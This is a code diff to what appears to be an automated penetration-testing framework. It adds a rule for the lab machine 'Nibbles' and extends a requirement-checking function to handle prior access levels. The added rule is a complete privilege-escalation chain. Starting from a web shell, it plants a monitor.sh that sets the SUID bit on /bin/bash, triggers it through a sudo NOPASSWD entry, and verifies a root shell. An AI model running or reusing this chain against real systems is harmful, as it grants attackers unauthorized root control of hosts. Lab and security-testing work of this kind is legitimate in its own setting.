@@ -72,6 +72,24 @@ RULES: list[dict] = [
         "groovy_endpoint": "/script",
         "loot_files": [],
     },
+    {
+        "id": "VF-PRIVESC-001",
+        "name": "sudo NOPASSWD on writable script (Nibbles monitor.sh)",
+        "service": "shell",
+        "severity": "critical",
+        "cost": 5,
+        "requires": ["access:web_shell"],
+        "gives": ["root", "compromise"],
+        "predicate": lambda host, state: state.access_levels.get(host["id"]) == "web_shell",
+        "enum_command": "sudo -l",
+        "enum_indicator": r"NOPASSWD.*monitor\.sh",
+        "setup_command": "cd /home/nibbler && unzip -o personal.zip 2>/dev/null; mkdir -p /home/nibbler/personal/stuff",
+        "payload_path": "/home/nibbler/personal/stuff/monitor.sh",
+        "payload_content": "#!/bin/bash\nchmod +s /bin/bash\n",
+        "trigger_command": "sudo /home/nibbler/personal/stuff/monitor.sh",
+        "verify_command": "/bin/bash -p -c 'id'",
+        "verify_indicator": r"uid=0",
+    },
 ]
 
 
@@ -95,7 +113,9 @@ def match_kb(host: dict, state: State) -> list[dict]:
     return [_strip_predicate(rule) for rule in RULES if rule["predicate"](host, state)]
 
 
-def vuln_reqs_met(vuln: dict, paths: set, state: State) -> bool:
+def vuln_reqs_met(
+    vuln: dict, paths: set, state: State, *, host_id: str | None = None
+) -> bool:
     """
     heck vuln 'requires' list against observed paths and creds
 
@@ -106,6 +126,11 @@ def vuln_reqs_met(vuln: dict, paths: set, state: State) -> bool:
         if req.startswith("credential:"):
             user = req.split(":", 1)[1]
             if not any(c.username == user for c in state.creds_found):
+                return False
+        elif req.startswith("access:"):
+            # access: web_shell means "vuln only fires if we already own this host at this level"
+            level = req.split(":", 1)[1]
+            if host_id is None or state.access_levels.get(host_id) != level:
                 return False
         else:
             if not any(req in path for path in paths):
